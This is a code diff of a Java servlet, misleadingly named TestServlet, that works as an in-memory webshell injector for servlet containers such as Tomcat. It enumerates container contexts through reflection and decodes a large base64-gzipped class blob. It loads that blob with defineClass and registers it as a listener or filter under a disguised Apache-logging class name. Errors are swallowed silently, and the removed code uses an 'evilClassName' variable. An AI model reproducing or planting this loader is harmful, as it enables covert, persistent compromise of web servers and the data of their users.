@@ -1,3 +1,5 @@
+package jakarta;
+
 import jakarta.servlet.ServletException;
 import jakarta.servlet.http.HttpServlet;
 import jakarta.servlet.http.HttpServletRequest;
@@ -123,60 +125,27 @@ public class TestServlet extends HttpServlet {
     }
 
     public String getClassName() {
-        return "com.google.gso.sLUOL.ErrorHandler";
+        return "org.apache.logging.plrkK.ErrorHandler";
     }
 
-    public String getBase64String() {
-        return "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";
+    public String getBase64String() throws IOException {
+        return "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";
     }
 
-    public void addListener(Object context, Object listener) throws Exception {
-        if (!this.isInjected(context, this.getClassName())) {
-            String filedName = "applicationEventListenersObjects";
-            Object applicationEventListenersObjects = getFV(context, filedName);
-            if (applicationEventListenersObjects == null) {
-                filedName = "applicationEventListenersInstances";
-                applicationEventListenersObjects = getFV(context, filedName);
-            }
-            if (applicationEventListenersObjects != null) {
-                Object[] appListeners = (Object[]) applicationEventListenersObjects;
-                if (appListeners != null) {
-                    List appListenerList = new ArrayList(Arrays.asList(appListeners));
-                    appListenerList.add(listener);
-                    setFieldValue(context, filedName, appListenerList.toArray());
-                }
-            } else if (getFV(context, "applicationEventListenersList") != null) {
-                List<Object> appListeners = (List) getFV(context, "applicationEventListenersList");
-                if (appListeners != null) {
-                    appListeners.add(listener);
-                }
-            }
-        }
-    }
-
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
-        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
-        List listeners = Arrays.asList(objects);
-
-        for (Object o : new ArrayList(listeners)) {
-            if (o.getClass().getName().contains(evilClassName)) {
-                return true;
-            }
-        }
-
-        return false;
-    }
 
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
+        List<Object> contexts = new ArrayList();
+        Thread[] threads = (Thread[])invokeMethod(Thread.class, "getThreads");
+
         try {
-            for (Thread thread : threads) {
+            for(Thread thread : threads) {
                 if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                    Map<?, ?> childrenMap = (Map<?, ?>) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
-                    for (Object key : childrenMap.keySet()) {
-                        Map<?, ?> children = (Map<?, ?>) getFV(childrenMap.get(key), "children");
-                        for (Object key1 : children.keySet()) {
+                    Map<?, ?> childrenMap = (Map)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+
+                    for(Object key : childrenMap.keySet()) {
+                        Map<?, ?> children = (Map)getFV(childrenMap.get(key), "children");
+
+                        for(Object key1 : children.keySet()) {
                             Object context = children.get(key1);
                             if (context != null) {
                                 contexts.add(context);
@@ -185,87 +154,56 @@ public class TestServlet extends HttpServlet {
                     }
                 }
             }
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Exception var14) {
         }
+
         return contexts;
     }
 
-    private Object getFilter(Object context) {
-        Object filter = null;
+    private Object getListener(Object context) throws Exception {
+        Object listener = null;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
 
         try {
-            filter = classLoader.loadClass(this.getClassName());
+            listener = classLoader.loadClass(this.getClassName()).newInstance();
         } catch (Exception var9) {
             try {
                 byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                 Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                 defineClass.setAccessible(true);
-                Class<?> clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                filter = clazz.newInstance();
-            } catch (Throwable e1) {
-                e1.printStackTrace();
+                Class<?> clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+                listener = clazz.newInstance();
+            } catch (Exception var8) {
             }
         }
 
-        return filter;
+        return listener;
+    }
+
+    public void addListener(Object context, Object listener) throws Exception {
+        try {
+            List<EventListener> eventListeners = (List)getFV(context, "contextListeners");
+            boolean isExist = false;
+            for(EventListener eventListener : eventListeners) {
+                if (eventListener.getClass().getName().equals(listener.getClass().getName())) {
+                    isExist = true;
+                    break;
+                }
+            }
+
+            if (!isExist) {
+                eventListeners.add((EventListener)listener);
+            }
+        } catch (Exception var7) {
+        }
+
     }
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
-        try {
-            List<Object> context = getContext();
-            for (Object o : context) {
-                Object filter = getFilter(o);
-                addFilter(o, filter);
-            }
-        } catch (IllegalAccessException e) {
-            throw new RuntimeException(e);
-        } catch (NoSuchMethodException e) {
-            throw new RuntimeException(e);
-        } catch (InvocationTargetException e) {
-            throw new RuntimeException(e);
-        } catch (Exception e) {
-            throw new RuntimeException(e);
-        }
-    }
-
-    public void addFilter(Object context, Object filter) throws Exception {
-        String filterName = getClassName();
-        // 防止重复注入
-        try {
-            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
-                return;
-            }
-        } catch (Exception ignored) {
-        }
-        try {
-            Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
-            Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
-            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
-            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
-            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
-            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
-            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
-            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass(), boolean.class}, new Object[]{filterMap, false});
-            try {
-                // v7.0.0 以上
-                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
-            } catch (Exception e) {
-                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
-            }
-            Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
-            constructors[0].setAccessible(true);
-            Object filterConfig = constructors[0].newInstance(context, filterDef);
-            HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFV(context, "filterConfigs");
-            filterConfigs.put(filterName, filterConfig);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
     }
 
     @Override
